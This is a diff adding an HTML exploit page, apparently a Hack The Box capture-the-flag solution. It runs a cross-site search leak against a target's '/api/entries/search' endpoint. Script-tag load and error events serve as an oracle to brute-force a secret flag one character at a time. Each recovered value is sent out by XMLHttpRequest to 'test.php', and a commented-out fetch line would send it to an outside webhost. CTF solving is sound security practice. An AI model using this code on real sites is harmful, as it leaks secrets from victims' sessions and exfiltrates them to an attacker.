@@ -1,0 +1,46 @@
+<html>
+	<script>
+		var local_ip = '167.99.202.193:32671';//'127.0.0.1:1337';
+		var url = 'http://'+local_ip+'/api/entries/search?q=';
+		var ngrok = 'civshell5.000webhostapp.com';
+		var flag = 'HTB{';
+		var char_list = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
+		
+		async function getChunk(char){
+			return new Promise((resolve, reject)=>{
+				const script = document.createElement("script");
+				script.src = url+encodeURIComponent(flag+char);
+				script.onload = () => char==='}' ? reject(char):resolve(char);
+				script.onerror = () => reject(char);
+				document.head.appendChild(script);
+			})
+		}
+		
+		async function getFlag(chars){
+			var a = false;
+			for(var i=0; i < chars.length; i++){
+				await getChunk(chars[i]).then((res) => {flag=flag.concat(res); a = res =='x' ? true:false; i=0}, (res) => { });
+				if (window.XMLHttpRequest){
+					xmlhttp = new XMLHttpRequest();
+				}else{
+					xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+				}
+
+				var PageToSendTo = "test.php?";
+				var VariablePlaceholder = "flag=";
+				var UrlToSend = PageToSendTo + VariablePlaceholder + flag;//MyVariable;
+
+				xmlhttp.open("GET", UrlToSend, false);
+				xmlhttp.send();
+				if (a) break;
+				}
+			}
+			//just create a way to put the text file in the website directory.
+			
+			//saveAs(text, "flag.txt");
+			//fetch('http://${ngrok}/flag=${flag}', {method: 'get'});
+		////};-->
+		
+		getFlag(char_list);
+	</script>
+</html>
